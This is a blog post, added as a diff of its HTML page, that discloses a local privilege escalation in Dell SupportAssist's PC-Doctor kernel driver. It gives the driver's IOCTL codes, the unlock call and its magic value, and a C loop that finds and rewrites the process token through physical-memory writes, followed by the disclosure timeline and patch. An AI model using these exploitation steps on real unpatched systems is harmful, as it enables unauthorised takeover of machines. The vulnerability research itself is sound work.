@@ -1,0 +1,508 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Dell SupportAssist Driver - Local Privilege Escalation - </title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="This post details a local privilege escalation (LPE) vulnerability I found
+in Dell&rsquo;s SupportAssist[0] tool. The bug is in a kernel driver &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <!--<header role="banner"><hgroup>
+  <h1><a href="/"></a></h1>
+  
+</hgroup>
+
+</header>-->
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Dell SupportAssist Driver - Local Privilege Escalation</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2018-05-17T21:00:00-07:00" pubdate data-updated="true">May 17<span>th</span>, 2018</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>This post details a local privilege escalation (LPE) vulnerability I found
+in Dell&rsquo;s SupportAssist[0] tool. The bug is in a kernel driver loaded by
+the tool, and is pretty similar to bugs found by ReWolf in
+ntiolib.sys/winio.sys[1], and those found by others in ASMMAP/ASMMAP64[2].
+These bugs are pretty interesting because they can be used to bypass driver
+signature enforcement (DSE) ad infinitum, or at least until they&rsquo;re no longer
+compatible with newer operating systems.</p>
+
+<p>Dell&rsquo;s SupportAssist is, according to the site, &ldquo;(..) now preinstalled on most
+of all new Dell devices running Windows operating system (..)&rdquo;. It&rsquo;s primary
+purpose is to troubleshoot issues and provide support capabilities both to the
+user and to Dell. There&rsquo;s quite a lot of functionality in this software itself,
+which I spent quite a bit of time reversing and may blog about at a later date.</p>
+
+<h2>Bug</h2>
+
+<p>Calling this a &ldquo;bug&rdquo; is really a misnomer; the driver exposes this
+functionality eagerly. It actually exposes a lot of functionality, much like
+some of the previously mentioned drivers. It provides capabilities for reading
+and writing the model-specific register (MSR), resetting the 1394 bus, and
+reading/writing CMOS.</p>
+
+<p>The driver is first loaded when the SupportAssist tool is launched, and the
+filename is <code>pcdsrvc_x64.pkms</code> on x64 and <code>pcdsrvc.pkms</code> on x86. Incidentally,
+this driver isn&rsquo;t actually even built by Dell, but rather another company,
+PC-Doctor[3]. This company provides &ldquo;system health solutions&rdquo; to a variety of
+companies, including Dell, Intel, Yokogawa, IBM, and others. Therefore, it&rsquo;s
+highly likely that this driver can be found in a variety of other products&hellip;</p>
+
+<p>Once the driver is loaded, it exposes a symlink to the device at
+<code>PCDSRVC{3B54B31B-D06B6431-06020200}_0</code> which is writable by unprivileged users
+on the system. This allows us to trigger one of the many IOCTLs exposed by the
+driver; approximately 30. I found a DLL used by the userland agent that served
+as an interface to the kernel driver and conveniently had symbol names
+available, allowing me to extract the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>// 0x222004 = driver activation ioctl
+</span><span class='line'>// 0x222314 = IoDriver::writePortData
+</span><span class='line'>// 0x22230c = IoDriver::writePortData
+</span><span class='line'>// 0x222304 = IoDriver::writePortData
+</span><span class='line'>// 0x222300 = IoDriver::readPortData
+</span><span class='line'>// 0x222308 = IoDriver::readPortData
+</span><span class='line'>// 0x222310 = IoDriver::readPortData
+</span><span class='line'>// 0x222700 = EcDriver::readData
+</span><span class='line'>// 0x222704 = EcDriver::writeData
+</span><span class='line'>// 0x222080 = MemDriver::getPhysicalAddress
+</span><span class='line'>// 0x222084 = MemDriver::readPhysicalMemory
+</span><span class='line'>// 0x222088 = MemDriver::writePhysicalMemory
+</span><span class='line'>// 0x222180 = Msr::readMsr
+</span><span class='line'>// 0x222184 = Msr::writeMsr
+</span><span class='line'>// 0x222104 = PciDriver::readConfigSpace
+</span><span class='line'>// 0x222108 = PciDriver::writeConfigSpace
+</span><span class='line'>// 0x222110 = PciDriver::?
+</span><span class='line'>// 0x22210c = PciDriver::?
+</span><span class='line'>// 0x222380 = Port1394::doesControllerExist
+</span><span class='line'>// 0x222384 = Port1394::getControllerConfigRom
+</span><span class='line'>// 0x22238c = Port1394::getGenerationCount
+</span><span class='line'>// 0x222388 = Port1394::forceBusReset
+</span><span class='line'>// 0x222680 = SmbusDriver::genericRead
+</span><span class='line'>// 0x222318 = SystemDriver::readCmos8
+</span><span class='line'>// 0x22231c = SystemDriver::writeCmos8
+</span><span class='line'>// 0x222600 = SystemDriver::getDevicePdo
+</span><span class='line'>// 0x222604 = SystemDriver::getIntelFreqClockCounts
+</span><span class='line'>// 0x222608 = SystemDriver::getAcpiThermalZoneInfo</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Immediately the MemDriver class jumps out. After some reversing, it appeared
+that these functions do exactly as expected: allow userland services to both
+read and write arbitrary physical addresses. There are a few quirks, however.</p>
+
+<p>To start, the driver must first be &ldquo;unlocked&rdquo; in order for it to begin
+processing control codes. It&rsquo;s unclear to me if this is some sort of hacky
+event trigger or whether the kernel developers truly believed this would
+inhibit malicious access. Either way, it&rsquo;s goofy. To unlock the driver, a
+simple ioctl with the proper code must be sent. Once received, the driver will
+process control codes for the lifetime of the system.</p>
+
+<p>To unlock the driver, we just execute the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>BOOL bResult;
+</span><span class='line'>DWORD dwRet;
+</span><span class='line'>SIZE_T code = 0xA1B2C3D4, outBuf;
+</span><span class='line'>
+</span><span class='line'>bResult = DeviceIoControl(hDriver, 0x222004, 
+</span><span class='line'>                          &code, sizeof(SIZE_T), 
+</span><span class='line'>                          &outBuf, sizeof(SIZE_T), 
+</span><span class='line'>                          &dwRet, NULL);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once the driver receives this control code and validates the received code
+(0xA1B2C3D4), it sets a global flag and begins accepting all other control
+codes.</p>
+
+<h2>Exploitation</h2>
+
+<p>From here, we could exploit this the same way rewolf did [4]: read out physical
+memory looking for process pool tags, then traverse these until we identify our
+process as well as a SYSTEM process, then steal the token. However, PCD
+appears to give us a shortcut via <code>getPhysicalAddress</code> ioctl. If this does
+indeed return the physical address of a given virtual address (VA), we can simply
+find the physical of our VA and enable a couple token privileges[5] using the
+<code>writePhysicalMemory</code> ioctl.</p>
+
+<p>Here&rsquo;s how the <code>getPhysicalAddress</code> function works:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>v5 = IoAllocateMdl(**(PVOID **)(a1 + 0x18), 1u, 0, 0, 0i64);
+</span><span class='line'>v6 = v5;
+</span><span class='line'>if ( !v5 )
+</span><span class='line'>  return 0xC0000001i64;
+</span><span class='line'>MmProbeAndLockPages(v5, 1, 0);
+</span><span class='line'>**(_QWORD **)(v3 + 0x18) = v4 & 0xFFF | ((_QWORD)v6[1].Next &lt;&lt; 0xC);
+</span><span class='line'>MmUnlockPages(v6);
+</span><span class='line'>IoFreeMdl(v6);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Keen observers will spot the problem here; the <code>MmProbeAndLockPages</code> call is
+passing in UserMode for the KPROCESSOR_MODE, meaning we won&rsquo;t be able to
+resolve any kernel mode VAs, only usermode addresses.</p>
+
+<p>We can still read chunks of physical memory unabated, however, as the
+<code>readPhysicalMemory</code> function is quite simple:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if ( !DoWrite )
+</span><span class='line'>{
+</span><span class='line'>  memmove(a1, a2, a3);
+</span><span class='line'>  return 1;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>They reuse a single function for reading and writing physical memory; we&rsquo;ll
+return to that. I decided to take a different approach than rewolf for a number
+of reasons with great results.</p>
+
+<p>Instead, I wanted to toggle on SeDebugPrivilege for my current process token.
+This would require finding the token in memory and writing a few bytes at a
+field offset. To do this, I used <code>readPhysicalMemory</code> to read chunks of memory
+of size 0x10000000 and checked for the first field in a _TOKEN, TokenSource. In
+a user token, this will be the string <code>User32</code>. Once we&rsquo;ve identified this,
+we double check that we&rsquo;ve found a token by validating the TokenLuid, which we
+can obtain from userland using the GetTokenInformation API.</p>
+
+<p>In order to speed up the memory search, I only iterate over the addresses that
+match the token&rsquo;s virtual address byte index. Essentially, when you convert a
+virtual address to a physical address (PA) the byte index, or the lower 12 bits,
+do not change. To demonstrate, assume we have a VA of 0xfffff8a001cc2060.
+Translating this to a physical address then:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; !pte  fffff8a001cc2060
+</span><span class='line'>                                           VA fffff8a001cc2060
+</span><span class='line'>PXE at FFFFF6FB7DBEDF88    PPE at FFFFF6FB7DBF1400    PDE at FFFFF6FB7E280070    PTE at FFFFF6FC5000E610
+</span><span class='line'>contains 000000007AC84863  contains 00000000030D4863  contains 0000000073147863  contains E6500000716FD963
+</span><span class='line'>pfn 7ac84     ---DA--KWEV  pfn 30d4      ---DA--KWEV  pfn 73147     ---DA--KWEV  pfn 716fd     -G-DA--KW-V
+</span><span class='line'>
+</span><span class='line'>kd&gt; ? 716fd * 0x1000 + 060
+</span><span class='line'>Evaluate expression: 1903153248 = 00000000`716fd060</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So our physical address is 0x716fd060 (if you&rsquo;d like to read more about
+converting VA to PA, check out this great Microsoft article[6]). Notice the
+lower 12 bits remain the same between VA/PA. The search loop then boiled down
+to the following code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>uStartAddr = uStartAddr + (VirtualAddress & 0xfff);
+</span><span class='line'>for (USHORT chunk = 0; chunk &lt; 0xb; ++chunk) {
+</span><span class='line'>    lpMemBuf = ReadBlockMem(hDriver, uStartAddr, 0x10000000);
+</span><span class='line'>    for(SIZE_T i = 0; i &lt; 0x10000000; i += 0x1000, uStartAddr += 0x1000){
+</span><span class='line'>        if (memcmp((DWORD)lpMemBuf + i, "User32 ", 8) == 0){
+</span><span class='line'>            
+</span><span class='line'>            if (TokenId &lt;= 0x0)
+</span><span class='line'>                FetchTokenId();
+</span><span class='line'>
+</span><span class='line'>            if (*(DWORD*)((char*)lpMemBuf + i + 0x10) == TokenId) {
+</span><span class='line'>                hTokenAddr = uStartAddr;
+</span><span class='line'>                break;
+</span><span class='line'>            }
+</span><span class='line'>        }
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    HeapFree(GetProcessHeap(), 0, lpMemBuf);
+</span><span class='line'>
+</span><span class='line'>    if (hTokenAddr &gt; 0x0)
+</span><span class='line'>        break;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once we identify the PA of our token, we trigger two separate writes at offset
+0x40 and offset 0x48, or the Enabled and Default fields of a _TOKEN. This
+sometimes requires a few runs to get right (due to mapping, which I was too
+lazy to work out), but is very stable.</p>
+
+<p>You can find the source code for the bug <a href="https://github.com/hatRiot/bugs">here</a>.</p>
+
+<h2>Timeline</h2>
+
+<p>04/05/18 &ndash; Vulnerability reported<br/>
+04/06/18 &ndash; Initial response from Dell<br/>
+04/10/18 &ndash; Status update from Dell<br/>
+04/18/18 &ndash; Status update from Dell<br/>
+05/16/18 &ndash; Patched version released (v2.2)</p>
+
+<h2>References</h2>
+
+<p>[0]
+<a href="http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist">http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist
+</a>[1] <a href="http://blog.rewolf.pl/blog/?p=1630">http://blog.rewolf.pl/blog/?p=1630
+</a>[2] <a href="https://www.exploit-db.com/exploits/39785/">https://www.exploit-db.com/exploits/39785/
+</a>[3] <a href="http://www.pc-doctor.com/">http://www.pc-doctor.com/
+</a>[4] <a href="https://github.com/rwfpl/rewolf-msi-exploit">https://github.com/rwfpl/rewolf-msi-exploit
+</a>[5] <a href="https://github.com/hatRiot/token-priv">https://github.com/hatRiot/token-priv
+</a>[6]
+<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\">https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\</a></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2018-05-17T21:00:00-07:00" pubdate data-updated="true">May 17<span>th</span>, 2018</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/kernel/'>kernel</a>, <a class='category' href='/blog/categories/privilege-escalation/'>privilege escalation</a>, <a class='category' href='/blog/categories/windows/'>windows</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/" data-via="" data-counturl="http://hatRiot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2017/09/19/abusing-delay-load-dll/" title="Previous Post: Abusing delay load DLLs for remote code injection">&laquo; Abusing delay load DLLs for remote code injection</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/19/abusing-delay-load-dll/">Abusing delay load DLLs for remote code injection</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/06/ntpdc-exploit/">ntpdc local buffer overflow</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/protostar-network/">Protostar solutions - Network</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/21/protostar-heap-exploits/">Protostar solutions - Heap Exploitation</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
